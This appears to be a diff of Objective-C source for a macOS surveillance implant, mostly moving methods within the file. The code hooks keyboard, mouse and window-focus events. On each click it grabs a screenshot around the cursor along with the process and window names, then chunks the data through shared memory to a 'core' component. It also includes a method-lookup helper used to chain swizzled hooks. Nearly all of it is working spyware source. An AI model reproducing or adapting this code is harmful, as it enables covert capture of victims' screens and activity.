@@ -29,264 +29,6 @@ static int height  = 30;
 
 // Lookup the next implementation of the given selector after the
 // default one. Returns nil if no alternate implementation is found.
-- (IMP)getImplementationOf: (SEL)lookup after: (IMP)skip
-{
-  BOOL found = NO;
-  
-  Class currentClass = object_getClass(self);
-  while (currentClass)
-    {
-      // Get the list of methods for this class
-      unsigned int methodCount;
-      Method *methodList = class_copyMethodList(currentClass, &methodCount);
-      
-      // Iterate over all methods
-      unsigned int i;
-      for (i = 0; i < methodCount; i++)
-        {
-          // Look for the selector
-          if (method_getName(methodList[i]) != lookup)
-            {
-              continue;
-            }
-          
-          IMP implementation = method_getImplementation(methodList[i]);
-          
-          // Check if this is the "skip" implementation
-          if (implementation == skip)
-            {
-              found = YES;
-            }
-          else if (found)
-            {
-              // Return the match.
-              free(methodList);
-              return implementation;
-            }
-        }
-      
-      // No match found. Traverse up through super class' methods.
-      free(methodList);
-      
-      currentClass = class_getSuperclass(currentClass);
-    }
-  return nil;
-}
-
-- (void)logMouse
-{
-  NSString *_windowName;
-  NSMutableData *processName;
-  NSMutableData *windowName;
-
-#ifdef DEBUG_MOUSE
-  infoLog(@"Left mouse down");
-#endif
-
-  //
-  // Read configuration
-  //
-  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
-                                                                 forAgent: AGENT_MOUSE
-                                                          withCommandType: CM_AGENT_CONF];
-
-  if (readData != nil)
-    {
-#ifdef DEBUG_MOUSE
-      verboseLog(@"Found configuration for Agent Mouse");
-#endif
-      shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
-
-      NSMutableData *confData = [NSMutableData dataWithBytes: shMemLog->commandData
-                                                      length: shMemLog->commandDataSize];
-
-      mouseStruct *mouseConfiguration = (mouseStruct *)[confData bytes];
-
-      width  = mouseConfiguration->width;
-      height = mouseConfiguration->height;
-    }
-  else
-    {
-#ifdef DEBUG_MOUSE
-      verboseLog(@"No configuration found for agent mouse");
-#endif
-    }
-
-#ifdef DEBUG_MOUSE
-  infoLog(@"height: %d", height);
-  infoLog(@"width: %d", width);
-#endif
-
-  NSPoint eventLocation = [NSEvent mouseLocation];
-  eventLocation.y = 800 - eventLocation.y;
-
-  CGImageRef screenShot;
-  NSBitmapImageRep *bitmapRep;
-  CGSize mouseRectSize = { .width = width, .height = height };
-  CGRect mouseRect  = {
-    .origin = { .x = eventLocation.x - mouseRectSize.width * 0.5, .y = eventLocation.y - mouseRectSize.height * 0.5 },
-    .size   = mouseRectSize,
-  };
-
-  screenShot = CGWindowListCreateImage(mouseRect,
-                                       kCGWindowListOptionOnScreenOnly,
-                                       kCGNullWindowID,
-                                       kCGWindowImageDefault);
-
-  if (screenShot == NULL)
-    {
-#ifdef DEBUG_MOUSE
-      errorLog(@"Error while obtaining screenshot");
-#endif
-      return;
-    }
-
-  bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
-  NSData *imageData = [bitmapRep representationUsingType: NSJPEGFileType
-                                              properties: nil];
-
-  //
-  // Logging
-  //
-#ifdef DEBUG_MOUSE
-  verboseLog(@"Writing block header (MouseAgent)");
-#endif
-
-  NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(mouseAdditionalStruct)];
-  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
-  NSString *_processName      = [[processInfo processName] copy];
-
-  processName  = [[NSMutableData alloc] initWithData:
-                     [_processName dataUsingEncoding:
-                     NSUTF16LittleEndianStringEncoding]];
-
-  _windowName = [[self title] copy];
-
-  windowName = [[NSMutableData alloc] initWithData:
-                    [_windowName dataUsingEncoding:
-                    NSUTF16LittleEndianStringEncoding]];
-
-  // Dummy word
-  short dummyWord = 0x0000;
-
-  mouseAdditionalStruct *mouseAdditionalHeader = (mouseAdditionalStruct *)[entryData bytes];
-  mouseAdditionalHeader->version           = LOG_MOUSE_VERSION;
-  mouseAdditionalHeader->processNameLength = [processName length] + sizeof(dummyWord);
-  mouseAdditionalHeader->windowNameLength  = [windowName length] + sizeof(dummyWord);
-  mouseAdditionalHeader->x = eventLocation.x - mouseRectSize.width * 0.5;
-  mouseAdditionalHeader->y = eventLocation.y - mouseRectSize.height * 0.5;
-
-  NSRect screenRes = [[NSScreen mainScreen] frame];
-#ifdef DEBUG_MOUSE
-  infoLog(@"screen X: %d", screenRes.origin.x);
-  infoLog(@"screen Y: %d", screenRes.origin.y);
-#endif
-  mouseAdditionalHeader->xMax = screenRes.origin.x;
-  mouseAdditionalHeader->yMax = screenRes.origin.y;
-
-  // Process Name
-  [entryData appendData: processName];
-
-  // Null terminator
-  [entryData appendBytes: &dummyWord
-                  length: sizeof(short)];
-
-  // Window Name
-  [entryData appendData: windowName];
-  // Null terminator
-  [entryData appendBytes: &dummyWord
-                  length: sizeof(short)];
-
-  // Now append the image
-  [entryData appendData: imageData];
-
-  int leftBytesLength = 0;
-  int byteIndex = 0;
-
-  if ([entryData length] > MAX_COMMAND_DATA_SIZE)
-    {
-      do
-        {
-          NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
-          shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
-
-          shMemoryHeader->status          = SHMEM_WRITTEN;
-          shMemoryHeader->agentID         = AGENT_MOUSE;
-          shMemoryHeader->direction       = D_TO_CORE;
-          shMemoryHeader->commandType     = CM_LOG_DATA;
-          shMemoryHeader->flag            = 0;
-          shMemoryHeader->commandDataSize = [entryData length];
-
-          leftBytesLength = (([entryData length] - byteIndex >= 0x300)
-                             ? 0x300
-                             : ([entryData length] - byteIndex));
-
-          memcpy(shMemoryHeader->commandData,
-                 [entryData bytes] + byteIndex,
-                 leftBytesLength);
-
-          if ([mSharedMemoryLogging writeMemory: logData
-                                         offset: 0
-                                  fromComponent: COMP_AGENT] == TRUE)
-            {
-#ifdef DEBUG_MOUSE
-              verboseLog(@"Mouse click sent through Shared Memory");
-#endif
-            }
-          else
-            {
-#ifdef DEBUG_MOUSE
-              errorLog(@"Error while logging mouse to shared memory");
-#endif
-            }
-
-          byteIndex += leftBytesLength;
-          [logData release];
-
-        } while (byteIndex < [entryData length]);
-    }
-  else
-    {
-      NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
-      shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
-
-      shMemoryHeader->status          = SHMEM_WRITTEN;
-      shMemoryHeader->agentID         = AGENT_MOUSE;
-      shMemoryHeader->direction       = D_TO_CORE;
-      shMemoryHeader->commandType     = CM_LOG_DATA;
-      shMemoryHeader->flag            = 0;
-      shMemoryHeader->commandDataSize = [entryData length];
-
-      memcpy(shMemoryHeader->commandData,
-             [entryData bytes],
-             [entryData length]);
-
-      if ([mSharedMemoryLogging writeMemory: logData
-                                     offset: 0
-                              fromComponent: COMP_AGENT] == TRUE)
-        {
-#ifdef DEBUG
-          infoLog(@"Mouse click sent through Shared Memory");
-#endif
-        }
-      else
-        {
-#ifdef DEBUG
-          errorLog(@"Error while logging mouse to shared memory");
-#endif
-        }
-
-      [logData release];
-    }
-
-  [entryData release];
-  [windowName release];
-  [_windowName release];
-  [processName release];
-  [_processName release];
-  [bitmapRep release];
-  CGImageRelease(screenShot);
-}
 
 - (void)logKeyboard: (NSEvent *)event
 {
@@ -458,6 +200,221 @@ static int height  = 30;
     }
 }
 
+- (void)logMouse
+{
+  NSString *_windowName;
+  NSMutableData *processName;
+  NSMutableData *windowName;
+  
+#ifdef DEBUG_MOUSE
+  infoLog(@"Left mouse down");
+#endif
+  
+  //
+  // Read configuration
+  //
+  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
+                                                                 forAgent: AGENT_MOUSE
+                                                          withCommandType: CM_AGENT_CONF];
+  
+  if (readData != nil)
+  {
+#ifdef DEBUG_MOUSE
+    verboseLog(@"Found configuration for Agent Mouse");
+#endif
+    shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
+    
+    NSMutableData *confData = [NSMutableData dataWithBytes: shMemLog->commandData
+                                                    length: shMemLog->commandDataSize];
+    
+    mouseStruct *mouseConfiguration = (mouseStruct *)[confData bytes];
+    
+    width  = mouseConfiguration->width;
+    height = mouseConfiguration->height;
+  }
+  else
+  {
+#ifdef DEBUG_MOUSE
+    verboseLog(@"No configuration found for agent mouse");
+#endif
+  }
+  
+#ifdef DEBUG_MOUSE
+  infoLog(@"height: %d", height);
+  infoLog(@"width: %d", width);
+#endif
+  
+  NSPoint eventLocation = [NSEvent mouseLocation];
+  eventLocation.y = 800 - eventLocation.y;
+  
+  CGImageRef screenShot;
+  NSBitmapImageRep *bitmapRep;
+  CGSize mouseRectSize = { .width = width, .height = height };
+  CGRect mouseRect  = {
+    .origin = { .x = eventLocation.x - mouseRectSize.width * 0.5, .y = eventLocation.y - mouseRectSize.height * 0.5 },
+    .size   = mouseRectSize,
+  };
+  
+  screenShot = CGWindowListCreateImage(mouseRect,
+                                       kCGWindowListOptionOnScreenOnly,
+                                       kCGNullWindowID,
+                                       kCGWindowImageDefault);
+  
+  if (screenShot == NULL)
+  {
+#ifdef DEBUG_MOUSE
+    errorLog(@"Error while obtaining screenshot");
+#endif
+    return;
+  }
+  
+  bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
+  NSData *imageData = [bitmapRep representationUsingType: NSJPEGFileType
+                                              properties: nil];
+  
+  //
+  // Logging
+  //
+#ifdef DEBUG_MOUSE
+  verboseLog(@"Writing block header (MouseAgent)");
+#endif
+  
+  NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(mouseAdditionalStruct)];
+  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
+  NSString *_processName      = [[processInfo processName] copy];
+  
+  processName  = [[NSMutableData alloc] initWithData:
+                  [_processName dataUsingEncoding:
+                   NSUTF16LittleEndianStringEncoding]];
+  
+  _windowName = [[self title] copy];
+  
+  windowName = [[NSMutableData alloc] initWithData:
+                [_windowName dataUsingEncoding:
+                 NSUTF16LittleEndianStringEncoding]];
+  
+  // Dummy word
+  short dummyWord = 0x0000;
+  
+  mouseAdditionalStruct *mouseAdditionalHeader = (mouseAdditionalStruct *)[entryData bytes];
+  mouseAdditionalHeader->version           = LOG_MOUSE_VERSION;
+  mouseAdditionalHeader->processNameLength = [processName length] + sizeof(dummyWord);
+  mouseAdditionalHeader->windowNameLength  = [windowName length] + sizeof(dummyWord);
+  mouseAdditionalHeader->x = eventLocation.x - mouseRectSize.width * 0.5;
+  mouseAdditionalHeader->y = eventLocation.y - mouseRectSize.height * 0.5;
+  
+  NSRect screenRes = [[NSScreen mainScreen] frame];
+#ifdef DEBUG_MOUSE
+  infoLog(@"screen X: %d", screenRes.origin.x);
+  infoLog(@"screen Y: %d", screenRes.origin.y);
+#endif
+  mouseAdditionalHeader->xMax = screenRes.origin.x;
+  mouseAdditionalHeader->yMax = screenRes.origin.y;
+  
+  // Process Name
+  [entryData appendData: processName];
+  
+  // Null terminator
+  [entryData appendBytes: &dummyWord
+                  length: sizeof(short)];
+  
+  // Window Name
+  [entryData appendData: windowName];
+  // Null terminator
+  [entryData appendBytes: &dummyWord
+                  length: sizeof(short)];
+  
+  // Now append the image
+  [entryData appendData: imageData];
+  
+  int leftBytesLength = 0;
+  int byteIndex = 0;
+  
+  if ([entryData length] > MAX_COMMAND_DATA_SIZE)
+  {
+    do
+    {
+      NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+      shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+      
+      shMemoryHeader->status          = SHMEM_WRITTEN;
+      shMemoryHeader->agentID         = AGENT_MOUSE;
+      shMemoryHeader->direction       = D_TO_CORE;
+      shMemoryHeader->commandType     = CM_LOG_DATA;
+      shMemoryHeader->flag            = 0;
+      shMemoryHeader->commandDataSize = [entryData length];
+      
+      leftBytesLength = (([entryData length] - byteIndex >= 0x300)
+                         ? 0x300
+                         : ([entryData length] - byteIndex));
+      
+      memcpy(shMemoryHeader->commandData,
+             [entryData bytes] + byteIndex,
+             leftBytesLength);
+      
+      if ([mSharedMemoryLogging writeMemory: logData
+                                     offset: 0
+                              fromComponent: COMP_AGENT] == TRUE)
+      {
+#ifdef DEBUG_MOUSE
+        verboseLog(@"Mouse click sent through Shared Memory");
+#endif
+      }
+      else
+      {
+#ifdef DEBUG_MOUSE
+        errorLog(@"Error while logging mouse to shared memory");
+#endif
+      }
+      
+      byteIndex += leftBytesLength;
+      [logData release];
+      
+    } while (byteIndex < [entryData length]);
+  }
+  else
+  {
+    NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+    shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+    
+    shMemoryHeader->status          = SHMEM_WRITTEN;
+    shMemoryHeader->agentID         = AGENT_MOUSE;
+    shMemoryHeader->direction       = D_TO_CORE;
+    shMemoryHeader->commandType     = CM_LOG_DATA;
+    shMemoryHeader->flag            = 0;
+    shMemoryHeader->commandDataSize = [entryData length];
+    
+    memcpy(shMemoryHeader->commandData,
+           [entryData bytes],
+           [entryData length]);
+    
+    if ([mSharedMemoryLogging writeMemory: logData
+                                   offset: 0
+                            fromComponent: COMP_AGENT] == TRUE)
+    {
+#ifdef DEBUG
+      infoLog(@"Mouse click sent through Shared Memory");
+#endif
+    }
+    else
+    {
+#ifdef DEBUG
+      errorLog(@"Error while logging mouse to shared memory");
+#endif
+    }
+    
+    [logData release];
+  }
+  
+  [entryData release];
+  [windowName release];
+  [_windowName release];
+  [processName release];
+  [_processName release];
+  [bitmapRep release];
+  CGImageRelease(screenShot);
+}
+
 - (void)hookKeyboardAndMouse: (NSEvent *)event
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -496,6 +453,16 @@ static int height  = 30;
   [self hookKeyboardAndMouse: event];
 }
 
+- (void)resignKeyWindowHook
+{
+#ifdef DEBUG_KEYB
+  infoLog(@"context switched: 0");
+#endif
+  
+  contextHasBeenSwitched = 0;
+  [self resignKeyWindowHook];
+}
+
 - (void)becomeKeyWindowHook
 {
 #ifdef DEBUG_KEYB
@@ -506,14 +473,48 @@ static int height  = 30;
   [self becomeKeyWindowHook];
 }
 
-- (void)resignKeyWindowHook
+- (IMP)getImplementationOf: (SEL)lookup after: (IMP)skip
 {
-#ifdef DEBUG_KEYB
-  infoLog(@"context switched: 0");
-#endif
-
-  contextHasBeenSwitched = 0;
-  [self resignKeyWindowHook];
+  BOOL found = NO;
+  
+  Class currentClass = object_getClass(self);
+  while (currentClass)
+  {
+    // Get the list of methods for this class
+    unsigned int methodCount;
+    Method *methodList = class_copyMethodList(currentClass, &methodCount);
+    
+    // Iterate over all methods
+    unsigned int i;
+    for (i = 0; i < methodCount; i++)
+    {
+      // Look for the selector
+      if (method_getName(methodList[i]) != lookup)
+      {
+        continue;
+      }
+      
+      IMP implementation = method_getImplementation(methodList[i]);
+      
+      // Check if this is the "skip" implementation
+      if (implementation == skip)
+      {
+        found = YES;
+      }
+      else if (found)
+      {
+        // Return the match.
+        free(methodList);
+        return implementation;
+      }
+    }
+    
+    // No match found. Traverse up through super class' methods.
+    free(methodList);
+    
+    currentClass = class_getSuperclass(currentClass);
+  }
+  return nil;
 }
 
 @end
